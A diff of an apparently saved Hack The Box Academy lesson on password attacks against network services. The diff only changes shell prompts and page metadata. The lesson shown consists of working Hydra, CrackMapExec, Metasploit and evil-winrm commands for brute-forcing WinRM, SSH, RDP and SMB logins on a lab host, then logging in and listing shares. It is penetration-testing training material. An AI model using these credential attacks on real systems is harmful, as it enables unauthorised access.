@@ -7,15 +7,13 @@
 // Module Difficulty: Medium
 // Section ID: 1327
 // Section Title: Network Services
-// Page Title: Hack The Box - Academy
-// Page Number: 4
+// Page Title: Password Attacks
+// Page Number: 04
 -->
 
 # Network Services
 
-**Module Name:** Password Attacks **Page Number:** 4
-
-#### 
+**Module Name:** Password Attacks **Page Number:** 04
 
 #### PASSWORD ATTACKS
 
@@ -28,13 +26,13 @@
 #### Installing CrackMapExec
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ sudo apt-get -y install crackmapexec
+[!bash!]$ sudo apt-get -y install crackmapexec
 ```
 
 #### CrackMapExec Menu Options
 
 ``` shell-session
-ndefstathiou@htb[/htb]$  crackmapexec -h
+[!bash!]$  crackmapexec -h
 usage: crackmapexec [-h] [-t THREADS] [--timeout TIMEOUT]
                     [--jitter INTERVAL] [--darrell]
                     [--verbose]
@@ -74,7 +72,7 @@ protocols:
 #### CrackMapExec Protocol-Specific Help
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ crackmapexec smb -h
+[!bash!]$ crackmapexec smb -h
 
 usage: crackmapexec smb [-h] [-id CRED_ID [CRED_ID ...]] [-u USERNAME [USERNAME ...]] [-p PASSWORD [PASSWORD ...]]
                         [-k] [--aesKey] [--kdcHost] [--gfail-limit LIMIT | --ufail-limit LIMIT | --fail-limit LIMIT]
@@ -111,11 +109,11 @@ optional arguments:
 #### CrackMapExec Usage
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
+[!bash!]$ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
 ```
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list
+[!bash!]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list
 
 WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
 WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
@@ -127,7 +125,7 @@ WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3
 #### Installing Evil-WinRM
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ sudo gem install evil-winrm
+[!bash!]$ sudo gem install evil-winrm
 
 Fetching little-plugger-1.1.4.gem
 Fetching rubyntlm-0.6.3.gem
@@ -146,11 +144,11 @@ Happy hacking! :)
 #### Evil-WinRM Usage
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>
+[!bash!]$ evil-winrm -i <target-IP> -u <username> -p <password>
 ```
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password
+[!bash!]$ evil-winrm -i 10.129.42.197 -u user -p password
 
 Evil-WinRM shell v3.3
 
@@ -170,7 +168,7 @@ Info: Establishing connection to remote endpoint
 #### Hydra - SSH
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197
+[!bash!]$ hydra -L user.list -P password.list ssh://10.129.42.197
 
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -183,7 +181,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:03:
 ```
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ ssh user@10.129.42.197
+[!bash!]$ ssh user@10.129.42.197
 
 The authenticity of host '10.129.42.197 (10.129.42.197)' can't be established.
 ECDSA key fingerprint is SHA256:MEuKMmfGSRuv2Hq+e90MZzhe4lHhwUEo4vWHOUSv7Us.
@@ -207,7 +205,7 @@ user@WINSRV C:\Users\user>
 #### Hydra - RDP
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197
+[!bash!]$ hydra -L user.list -P password.list rdp://10.129.42.197
 
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -226,11 +224,11 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-10 15:05:
 #### xFreeRDP
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ xfreerdp /v:<target-IP> /u:<username> /p:<password>
+[!bash!]$ xfreerdp /v:<target-IP> /u:<username> /p:<password>
 ```
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ xfreerdp /v:10.129.42.197 /u:user /p:password
+[!bash!]$ xfreerdp /v:10.129.42.197 /u:user /p:password
 
 ...SNIP...
 New Certificate details:
@@ -249,7 +247,7 @@ Do you trust the above certificate? (Y/T/N) Y
 #### Hydra - SMB
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
+[!bash!]$ hydra -L user.list -P password.list smb://10.129.42.197
 
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -264,7 +262,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:37:
 #### Hydra - Error
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197
+[!bash!]$ hydra -L user.list -P password.list smb://10.129.42.197
 
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
@@ -278,7 +276,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-01-06 19:38:
 #### Metasploit Framework
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ msfconsole -q
+[!bash!]$ msfconsole -q
 
 msf6 > use auxiliary/scanner/smb/smb_login
 msf6 auxiliary(scanner/smb/smb_login) > options 
@@ -337,7 +335,7 @@ msf6 auxiliary(scanner/smb/smb_login) > run
 #### CrackMapExec
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
+[!bash!]$ crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares
 
 SMB         10.129.42.197   445    WINSRV           [*] Windows 10.0 Build 17763 x64 (name:WINSRV) (domain:WINSRV) (signing:False) (SMBv1:False)
 SMB         10.129.42.197   445    WINSRV           [+] WINSRV\user:password 
@@ -353,7 +351,7 @@ SMB         10.129.42.197   445    WINSRV           IPC$            READ        
 #### Smbclient
 
 ``` shell-session
-ndefstathiou@htb[/htb]$ smbclient -U user \\\\10.129.42.197\\SHARENAME
+[!bash!]$ smbclient -U user \\\\10.129.42.197\\SHARENAME
 
 Enter WORKGROUP\user's password: *******
 
